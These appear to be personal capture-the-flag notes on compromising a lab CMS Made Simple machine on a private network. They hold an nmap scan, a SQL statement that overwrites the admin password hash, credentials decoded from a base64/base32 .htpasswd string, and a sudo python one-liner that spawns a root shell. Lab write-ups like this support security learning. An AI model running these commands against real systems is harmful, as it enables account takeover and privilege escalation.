----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# My-CMSMS
# 25/2/2023

----------------------------------------------------
# dir
----------------------------------------------------
http://192.168.141.74/admin/login.php
http://192.168.141.74/phpmyadmin
----------------------------------------------------
# my sql
----------------------------------------------------
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'hackNos'))) where username = 'admin'; 
//Pass hackNos

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 8.0.19

----------------------------------------------------
# priv esc
----------------------------------------------------
cat .htpasswd
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=

┌──(kali㉿kali)-[~]
└─$ echo "TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=" | base64 -d
MFZG233VOI5FG2DJMVWGIQBRGIZQ====                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ echo "MFZG233VOI5FG2DJMVWGIQBRGIZQ====" | base32 -d            
armour:Shield@123    

armour@mycmsms:~$ sudo -l
    (root) NOPASSWD: /usr/bin/python

/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'